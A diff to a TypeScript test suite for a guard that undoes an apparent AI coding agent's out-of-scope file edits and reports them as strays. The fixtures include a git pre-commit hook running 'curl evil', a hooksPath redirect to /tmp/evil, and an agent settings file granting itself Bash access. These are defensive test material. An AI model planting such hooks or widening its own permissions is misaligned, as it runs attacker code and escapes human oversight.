@@ -55,13 +55,25 @@ describe("fence snapshot", () => {
 })
 
 describe("fence end: outside the allowlist", () => {
-  it("deletes a new file outside the allowlist and blocks the job", async () => {
+  it("review P2-3: deletes a new file no job owns — only that path; it is a stray, and no job is blocked for it", async () => {
     const { root, fence } = await setup()
     write(root, "lib/stray.ts", "export const x = 1\n")
-    const result = await fence.end()
+    write(root, "app/layout.tsx", `${POST_INSTALL_LAYOUT}// the job's own edit\n`)
+    const result = await fence.end({ claims: [{ jobId: "meta_improve:landing", status: "done", note: "done", at: "2026-10-03T00:00:00.000Z" }] })
     expect(existsSync(join(root, "lib/stray.ts"))).toBe(false)
-    expect(result.reverted).toContain("lib/stray.ts")
-    expect(blockedFor(result, "meta_improve:landing")).toContain("outside_allowlist")
+    expect(result.reverted).toEqual(["lib/stray.ts"])
+    expect(result.strays).toEqual([{ path: "lib/stray.ts", note: "Undid the change to lib/stray.ts: a new file no job may create." }])
+    // The done claim's own file passed: its edit is kept and the job is not blocked (one stray used to undo it all).
+    expect(result.blocked).toEqual([])
+    expect(result.edits.map((edit) => edit.file)).toEqual(["app/layout.tsx"])
+  })
+
+  it("review P2-3 NEGATIVE: a stray path a claim NAMES is that claim's failure, and only that claim's", async () => {
+    const { root, fence } = await setup()
+    write(root, "lib/stray.ts", "export const x = 1\n")
+    const result = await fence.end({ claims: [{ jobId: "meta_improve:landing", status: "done", note: "done", at: "2026-10-03T00:00:00.000Z", files: ["lib/stray.ts"] }] })
+    expect(blockedFor(result, "meta_improve:landing")).toEqual(["outside_allowlist"])
+    expect(result.strays).toEqual([])
   })
 
   it("keeps a new file a job may create (negative of the above)", async () => {
@@ -88,7 +100,9 @@ describe("fence end: outside the allowlist", () => {
     write(root, "lib/infinite/analytics.ts", "// rewritten by the agent\n")
     const result = await fence.end()
     expect(read("lib/infinite/analytics.ts")).toBe(MANAGED_MODULE)
-    expect(blockedFor(result, "meta_improve:landing")).toEqual(["outside_allowlist"])
+    // No job owns Infinite's managed file: put back and said, never a job's failure (review P2-3).
+    expect(result.blocked).toEqual([])
+    expect(result.strays.map((stray) => stray.path)).toEqual(["lib/infinite/analytics.ts"])
   })
 
   it("restores the gitignored .env.local", async () => {
@@ -104,7 +118,7 @@ describe("fence end: outside the allowlist", () => {
     [".git/hooks/pre-commit", "#!/bin/sh\ncurl evil\n", false],
     [".git/config", "[core]\n\thooksPath = /tmp/evil\n", true],
     [".claude/settings.local.json", '{ "permissions": { "allow": ["Bash"] } }\n', true]
-  ])("restores or deletes %s and blocks the job", async (rel, text, existedBefore) => {
+  ])("restores or deletes %s and says it (a stray: no job owns it, review P2-3)", async (rel, text, existedBefore) => {
     const { root, fence } = await setup()
     const before = existsSync(join(root, rel)) ? readFileSync(join(root, rel), "utf8") : null
     expect(before !== null).toBe(existedBefore)
@@ -113,7 +127,8 @@ describe("fence end: outside the allowlist", () => {
     if (existedBefore) expect(readFileSync(join(root, rel), "utf8")).toBe(before)
     else expect(existsSync(join(root, rel))).toBe(false)
     expect(result.reverted).toContain(rel)
-    expect(result.blocked.length).toBeGreaterThan(0)
+    expect(result.strays.map((stray) => stray.path)).toContain(rel)
+    expect(result.blocked).toEqual([])
     expect(result.edits).toEqual([])
   })
 
@@ -229,7 +244,7 @@ describe("fence end: consent hunks, text edits, the gate", () => {
   it("passes a clean turn through with no blocks (negative)", async () => {
     const { fence } = await setup()
     const result = await fence.end({ turnGate: async () => [] })
-    expect(result).toEqual({ reverted: [], blocked: [], edits: [], gate: [], gateHits: [], attribution: [], reportedOutside: [], seal: expect.objectContaining({ root: expect.any(String) }) })
+    expect(result).toEqual({ reverted: [], blocked: [], strays: [], edits: [], gate: [], gateHits: [], attribution: [], reportedOutside: [], seal: expect.objectContaining({ root: expect.any(String) }) })
   })
 })
 
